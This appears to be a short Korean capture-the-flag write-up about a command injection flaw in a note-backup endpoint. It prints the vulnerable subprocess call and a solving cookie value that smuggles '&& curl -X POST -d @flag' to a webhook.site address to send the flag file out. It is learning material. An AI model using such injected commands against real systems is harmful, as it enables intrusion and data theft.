---
tier: Bronze 2
topics:
  - Command Injection
solved-with: Self
---
### 문제 구조

- 다른 코드들은 노트를 생성/수정/삭제 하는 기본적인 기능들 
- `/backup_notes`: 현재 시간을 쿠키로 저장한 backup-timestamp의 값을 가져와서 노트들의 내용을 해당 폴더명으로 저장
``` python
def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)
```
- `flag`: 플래그가 담겨 있는 파일 

### 분석 및 풀이

목표: timestamp에 명령어를 삽입하여 webhook.site로 flag 파일의 내용을 보내면 됨. 

브라우저에서 backup-timestamp 쿠키를 `1794114592 && curl -X POST -d @flag "https://webhook.site/..."` 로 수정 후 POST `/backup_notes` 요청을 보냄.

### 새롭게 배운 점

[[04-OS-명령어주입]]

